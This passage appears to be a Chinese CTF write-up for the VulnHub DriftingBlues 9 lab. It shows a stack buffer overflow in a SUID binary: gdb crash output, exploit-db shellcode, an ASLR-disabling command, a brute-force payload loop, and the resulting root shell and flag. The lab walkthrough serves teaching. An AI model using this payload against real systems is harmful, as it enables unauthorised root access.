Starting program: /home/kali/temp/driftingblues9/input AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

使用网上找到的payload：https://www.exploit-db.com/exploits/13357

```text
char sc[] = 
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
# 55
```

`payload` 55 字节：

> Payload：[ NOP / 58] + [ shellcode / 55 ] + [ PAD / 58 ] + [ EIP ]

先关闭一下kali的ASLR：

```bash
sudo sysctl -w kernel.randomize_va_space=0
```

在靶机上运行：

```bash
(remote) clapton@debian:/home/clapton$ gdb -q input 
Reading symbols from input...(no debugging symbols found)...done.
(gdb) r $(python -c 'print("A" * 171 + "B" * 4 + "\x90" * 64 )')
Starting program: /home/clapton/input $(python -c 'print("A" * 171 + "B" * 4 + "\x90" * 64 )')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/s $esp
0xbf84e7a0:     '\220' <repeats 64 times>
```

构造payload：

```bash
r $(python -c 'print("A" * 171 + "\xa0\xe7\x84\xbf" + "\x90" * 1000 + "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80")')
```

```
for i in {1..10000}; do (./input $(python -c 'print("A" * 171 + "\xa0\xe7\x84\xbf" + "\x90" * 1000 + "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80")')) ; done
```

运行拿到flag：

```bash
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
# whoami;id
root
uid=1000(clapton) gid=1000(clapton) euid=0(root) groups=1000(clapton)
# cd /root
# ls -la
total 16
drwx------  2 root root 4096 May  9  2021 .
drwxr-xr-x 21 root root 4096 May  9  2021 ..
-rw-------  1 root root  649 May  9  2021 .bash_history
-rw-r--r--  1 root root  295 May  9  2021 root.txt
# cat root.txt
   
this is the final of driftingblues series. i hope you've learned something from them.

you can always contact me at vault13_escape_service[at]outlook.com for your questions. (mail language: english/turkish)

your root flag:

04D4C1BEC659F1AA15B7AE731CEEDD65

good luck. ( ͡° ͜ʖ ͡°)
```

呜呜呜，pwn爷才是yyds，一定要学会pwn！！！

## 参考

https://bbs.kanxue.com/thread-259723.htm

https://devgiants.fr/blog/2021/07/15/drifting-blues-9-writeup/

https://vishal-chandak.medium.com/vulnhub-driftingblues-9-final-f39b59b3c38f

https://zhuanlan.zhihu.com/p/570218595